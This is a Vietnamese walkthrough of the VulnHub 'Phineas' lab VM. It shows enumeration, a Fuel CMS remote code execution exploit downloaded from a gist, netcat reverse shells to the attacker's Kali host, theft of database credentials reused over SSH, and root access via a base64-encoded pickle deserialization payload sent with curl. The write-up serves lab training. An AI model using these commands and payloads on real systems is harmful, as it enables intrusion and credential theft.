# LAB7-PHINEAS
```
https://www.vulnhub.com/entry/phineas-1,674/
```
## Chuẩn bị
* Kali Linux: 192.168.56.102

![image](https://user-images.githubusercontent.com/92532460/224360694-63aa7ed5-bab3-4c75-b8f8-1d6bfa379a71.png)
* Máy victim: Phineas

![image](https://user-images.githubusercontent.com/92532460/224361226-52c75d9f-84ad-4dc9-a739-e2a3193556b7.png)
## Xác định mục tiêu
* Đầu tiên, tôi phải xác định địa chỉ IP của máy mục tiêu.
```
sudo netdiscover -i eth0 -r 192.168.56.0/24
```
![image](https://user-images.githubusercontent.com/92532460/224361784-d7727742-ebb1-44ee-a64b-24cdb8abde66.png)

* Xác định máy mục tiêu có IP là 192.168.56.103
## Xác định cổng mở
* Bước tiếp theo là xác định các cổng mở trên máy.
```
map  -sC -sV  192.168.56.103  
```
![image](https://user-images.githubusercontent.com/92532460/224362642-23fed275-0b91-4210-b5b0-fc7c504fbbc1.png)

* Từ ảnh chụp màn hình ở trên, chúng tôi nhận thấy rằng chúng tôi có các dịch vụ http và mysql bị lộ.
## Liệt kê máy chủ web
* Tiếp theo, tôi đã thử liệt kê thư mục trên máy chủ web
```
gobuster dir -u http://192.168.56.103 -x txt,php,html --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![image](https://user-images.githubusercontent.com/92532460/224364528-371d6ec6-a244-451c-a695-ea8e6c1c7704.png)
* Tôi đã mở đường dẫn trên trình duyệt của mình để liệt kê thêm và không có gì quan trọng.

![image](https://user-images.githubusercontent.com/92532460/224364781-452105e2-30ec-4a41-bd22-aa98538eb965.png)

* Vì vậy, tôi đã phải chạy lại gobuster cho đường dẫn này.
```
gobuster dir -u http://192.168.56.103/structure -x txt,php,html --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![image](https://user-images.githubusercontent.com/92532460/224365138-177e2666-1748-4ef6-b597-16ba3b2b339f.png)

* Bây giờ, tôi đã tìm thấy một đường dẫn/fuel có thể đã cài đặt CMS fuel. Do đó, tôi quyết định thực hiện việc liệt kê thư mục một lần nữa.
```
gobuster dir -u http://192.168.56.103/structure/fuel -x txt,php,html --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![image](https://user-images.githubusercontent.com/92532460/224365524-c62b10f4-e46e-45ee-917b-4b8b5d3012b8.png)
* Với một chút nghiên cứu về các thư mục khác nhau và cấu trúc của dự án, tôi biết rằng điều này có cài đặt Fuel CMS. Tuy nhiên, khi tôi cố mở nó trên trình duyệt, tôi không nhận được trang chủ Fuel CMS.

![image](https://user-images.githubusercontent.com/92532460/224365829-6178e58b-0d4c-4b80-a90e-e02e4be76775.png)

* Vì vậy, tôi đã cố gắng thêm /fuel vào tất cả các đường dẫn mà chúng tôi biết trong đường dẫn/structure. Ở lần thử đầu tiên, tôi đã nhận được url chính xác là /structure/index.php/fuel.

![image](https://user-images.githubusercontent.com/92532460/224366316-45560b91-4ce5-4243-ad3b-0afc8760c413.png)

* Fuel CMS có lỗ hổng thực thi mã từ xa chưa được xác thực. Trong db khai thác, có hai ID cho cùng một khai thác. Sử dụng file exploit.py để khai thác:```https://gist.github.com/kriss-u/8e1b44b1f4e393cf0d8a69117227dbd2```
```
wget https://gist.githubusercontent.com/kriss-u/8e1b44b1f4e393cf0d8a69117227dbd2/raw/4419f8dc7090a41c7ebc96048daf67c43c1996a3/exploit.py

python3 exploit.py
```
![image](https://user-images.githubusercontent.com/92532460/224368779-c46457c0-b163-46f0-8746-9f2e9c89f3c3.png)

*Bây giờ, chúng ta có thể chạy bất kỳ lệnh nào giống như linux shell. Tuy nhiên, thật tốt khi có một reverse shell phù hợp. Mục tiêu đã cài đặt netcat. Do đó, tôi đã nghe trên cổng 4444.
```
nc -nlvp 4444
```
![image](https://user-images.githubusercontent.com/92532460/224369619-e93417da-ca1a-4709-877d-8de26a81078a.png)

* Trên máy mục tiêu:
```
which nc
nc 192.168.56.102 4444 -e /bin/bash
```
![image](https://user-images.githubusercontent.com/92532460/224369563-66583b92-0f1b-43c7-833b-1b64ad2be9dd.png)

* Cuối cùng, tôi đã có một reverse shell. Tôi đã cố gắng để có được một cái shell thích hợp, tuy nhiên, tôi đã không gặp may. Vì vậy, tôi quyết định tìm kiếm thông tin đăng nhập. Tôi đã tìm thấy thông tin đăng nhập cơ sở dữ liệu trong / Fuel/application/config/database.php
```
cd /var/www/html/structure/fuel/application/config
cat database.php
```
![image](https://user-images.githubusercontent.com/92532460/224369974-eb8390d8-5ddd-47be-8acd-5dc54ea4a5c4.png)

* Bây giờ chúng tôi đã biết mật khẩu, chúng tôi cũng có thể thử mật khẩu này trên SSH. Khi tôi cố gắng SSH với tư cách là người dùng anna bằng mật khẩu, tôi đã thành công
```
ssh anna@192.168.56.103
```
![image](https://user-images.githubusercontent.com/92532460/224370578-409e8214-7de6-4a1d-9d09-8dddc26203a7.png)

![image](https://user-images.githubusercontent.com/92532460/224371468-49a12316-bbda-4470-b3de-8ecc146cff13.png)

## Nâng cấp đặc quyền lên root
* Vì tôi có quyền truy cập vào anna, tôi đã xem các thư mục của cô ấy. Có một thư mục thú vị 'web' có mã dễ bị khai thác deserialization.
```
cd web
ls -al
cat app.py
```
![image](https://user-images.githubusercontent.com/92532460/224371909-868d5edf-6b35-412b-bde7-ff5009dc0066.png)

* Trong đoạn cắt ở trên, chúng ta có thể thấy rằng có một tham số POST 'awesome' có dữ liệu được tải bởi bộ chọn mô-đun. Đây là lỗ hổng khiến nó không kiểm tra loại dữ liệu nào có thể được gửi qua đường POST '/heaven'.

* Theo mặc định, một ứng dụng bình thường chạy trên cổng 5000. Vì vậy, tôi đã xác nhận điều này trước.
```
netstat -tnlp
```
![image](https://user-images.githubusercontent.com/92532460/224372090-44f5e145-9bab-45e3-8a3d-4a995cb16985.png)

* Có rất nhiều tài nguyên có sẵn liên quan đến vấn đề deserialization không an toàn trên internet. Tuy nhiên, đối với tải trọng, tôi đã tìm thấy ý chính sau và sửa đổi nó cho phù hợp với python 3.
```
wget https://gist.githubusercontent.com/kriss-u/085569495cb930e398759c0cbf45e3b7/raw/15fe119ed307ac69673bcaadd9fab84c32a85a00/pickle-payload-py3.py
python3 pickle-payload-py3.py "nc 192.168.56.102 9999 -e /bin/bash"
```
![image](https://user-images.githubusercontent.com/92532460/224372970-8f278f4d-d186-4798-986c-3509b847bd9f.png)

* Tôi bắt đầu nghe trên cổng 9999.
```
nc -nlvp 9999
```
* Sau đó, tôi chỉ cần chạy POST dữ liệu bằng CURL. Ngoài ra, bạn có thể chuyển cổng tới máy cục bộ của mình. Nhưng tại sao phải làm gì nếu chúng ta có curl trong máy mục tiêu.
```
curl -d "awesome=gASVPgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCNuYyAxOTIuMTY4LjU2LjEwMiA5OTk5IC1lIC9iaW4vYmFzaJSFlFKULg==" -X POST http://127.0.0.1:5000/heaven
```
![image](https://user-images.githubusercontent.com/92532460/224374250-88f6f7af-f5fa-4179-96b8-63950a526a0e.png)

* Và, theo cách này, chúng ta có được reverse shell của root. Bây giờ, đây là lúc để có được lá cờ.
```
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
cd /root
ls -al
cat root.txt
```
![image](https://user-images.githubusercontent.com/92532460/224374526-bf612c68-6e58-44b6-a065-8e2a8972d966.png)





